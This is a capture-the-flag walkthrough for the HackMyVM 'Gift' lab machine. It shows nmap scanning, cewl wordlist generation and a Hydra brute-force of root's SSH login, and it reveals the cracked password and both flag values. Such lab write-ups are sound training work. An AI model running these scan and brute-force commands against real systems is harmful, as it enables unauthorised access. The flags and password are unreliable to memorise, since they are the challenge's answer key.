@@ -1,0 +1,50 @@
+🧩 Gift Machine Walkthrough – HackMyVM
+Difficulty: Easy
+Goal: Gain direct root access via SSH using a weak password discovered through a brute-force attack with a custom wordlist.
+Target IP: 192.168.1.135
+Test Date: 14/06/2025
+
+🔍 Initial Enumeration
+Full TCP port scan:
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135
+Service and version detection on discovered ports:
+
+nmap -sCV -p22 192.168.1.135
+Discovered open port:
+
+22/tcp – SSH
+
+📜 Wordlist Generation for Brute Force
+A custom password list was created by crawling the site using Cewl:
+
+cewl http://192.168.1.135/index.html > pass.txt
+🔑 Initial Access via Hydra SSH Brute Force
+Hydra was used to brute-force the root user’s SSH login with the generated wordlist:
+
+hydra -l root -P pass.txt ssh://192.168.1.135 -t 64 -I
+Access was successfully obtained using the password: simple
+
+SSH login:
+
+ssh root@192.168.1.135
+Confirmation:
+
+The authenticity of host '192.168.1.135' can't be established...
+root@192.168.1.135's password: simple
+IM AN SSH SERVER
+Access granted directly as root.
+
+🏁 Flag Retrieval
+As root, both flags were read:
+
+user.txt → HMV665sXzDS
+
+root.txt → HMVtyr543FG
+
+🎯 Conclusion
+The SSH-Gift machine was trivially compromised due to the following security issue:
+
+Weak SSH credentials for the root account were susceptible to a brute-force attack using a custom wordlist.
+
+This exercise demonstrates how even a single point of failure, such as poor password hygiene, can lead to a complete system compromise without the need for privilege escalation techniques.
